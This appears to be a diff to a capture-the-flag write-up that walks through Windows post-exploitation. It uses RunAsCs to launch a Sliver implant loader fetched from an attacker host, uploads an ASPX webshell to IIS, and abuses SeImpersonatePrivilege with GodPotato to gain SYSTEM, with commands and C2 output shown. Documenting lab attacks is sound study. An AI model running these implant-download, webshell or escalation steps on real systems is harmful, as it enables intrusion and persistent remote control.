@@ -991,15 +991,42 @@ Info: Upload successful!
  48141657   mtls       10.0.29.180:50583    DC-CC     CITY\sam.brooks   windows/amd64     [ALIVE]
 ```
 
-## 9.3 Obtaining IIS Shell via Webshell
+## 9.3 Sliver C2 Session as web_admin
 
-Since the Sliver stager wasn't working directly through `RunAsCs`, an ASPX webshell was deployed to the IIS wwwroot directory to execute the implant as the IIS service account.
+With the sam.brooks Sliver session established, `RunAsCs` was used to execute the Sliver implant loader as `web_admin`, obtaining a second C2 session under the IIS management account.
+
+```
+*Evil-WinRM* PS C:\tools> .\run.exe web_admin '[REDACTED]' "C:\tools\runner.exe -remote http://10.200.38.219:8000/implant.enc" -d city.local
+[*] Warning: User profile directory for user web_admin does not exists. Use --force-profile if you want to force the creation.
+[*] Warning: The logon for user 'web_admin' is limited. Use the flag combination --bypass-uac and --logon-type '5' to obtain a more
+privileged token.
+```
+
+Verifying the new session identity in Sliver:
+
+```
+[server] sliver > use
+
+[*] Active session BIG_BRICK (48141657-5ab2-4136-9037-95d6d3c8c025)
+
+[server] sliver (BIG_BRICK) > whoami
+
+Logon ID: CITY\sam.brooks
+[*] Current Token ID: CITY\sam.brooks
+[server] sliver (BIG_BRICK) >
+```
+
+The session came back as `sam.brooks` rather than `web_admin` due to token limitations with `RunAsCs`. A different approach was needed.
+
+## 9.4 Webshell Deployment
+
+Since the Sliver stager through `RunAsCs` didn't yield a proper `web_admin` token, an ASPX webshell was uploaded to the IIS wwwroot directory to execute the implant directly as the IIS service account. The webshell (`shell.aspx`) was copied to `C:\inetpub\wwwroot\` using the sam.brooks Evil-WinRM session.
 
 <div style="text-align: center;">
   <img src="/assets/images/ctf/city/webshell-runner.png" alt="ASPX webshell executing runner.exe with Sliver implant" style="max-width: 100%;" />
 </div>
 
-The webshell at `http://city.local/shell.aspx` executed the runner binary, establishing a new Sliver session as the IIS service account.
+The webshell at `http://city.local/shell.aspx` was used to execute `c:\tools\runner.exe` with the Sliver implant URL, establishing a new C2 session running as the IIS service account.
 
 ```
 Shell exitedc5174231 BIG_BRICK - 10.0.29.180:50754 (DC-CC) - windows/amd64 - Fri, 06 Mar 2026 14:54:52 PST
@@ -1017,7 +1044,7 @@ Shell exitedc5174231 BIG_BRICK - 10.0.29.180:50754 (DC-CC) - windows/amd64 - Fri
 [*] Started remote shell [3] with pid 5968
 ```
 
-## 9.4 SeImpersonatePrivilege
+## 9.5 SeImpersonatePrivilege
 
 The IIS service account has `SeImpersonatePrivilege`, which is a well-known escalation vector on Windows.
 
@@ -1043,7 +1070,7 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
 
-## 9.5 GodPotato to SYSTEM
+## 9.6 GodPotato to SYSTEM
 
 GodPotato was used to abuse `SeImpersonatePrivilege` and execute the Sliver implant loader as `NT AUTHORITY\SYSTEM`. The payload was wrapped with Donut to generate position-independent shellcode from the GodPotato executable.
 
